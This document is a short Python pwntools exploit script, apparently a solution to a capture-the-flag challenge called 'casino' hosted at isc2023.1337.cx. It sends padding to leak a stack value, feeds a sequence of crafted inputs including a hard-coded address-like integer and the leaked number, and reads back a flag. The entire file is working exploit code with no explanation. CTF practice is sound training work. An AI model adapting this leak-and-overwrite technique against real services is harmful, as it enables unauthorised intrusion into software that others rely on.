from pwn import *
context(arch = 'i386', os = 'linux')


p = process('./casino')
p = remote('isc2023.1337.cx', 10016)
to_send = b"23"
p.sendline(to_send)

to_send = b"B" * 36
p.sendline(to_send)

output = p.recvuntil(b"stop):")


begin_of_as = output.find(b"B" * 36) + 36
hex_value = output[begin_of_as: begin_of_as + 4]
lucky_number = int.from_bytes(hex_value, byteorder="little")

for i in range(56):
    p.sendline(b"9")

p.sendline(b"134517334")
p.sendline(b"9")
p.sendline(str(lucky_number).encode())
p.sendline(b"x")
p.sendline(b"Y")

print("Flag")
output = p.recvall()
idx = output.find(b"SpeishFlag")
flag = output[idx:].decode()
print(flag)
p.close()
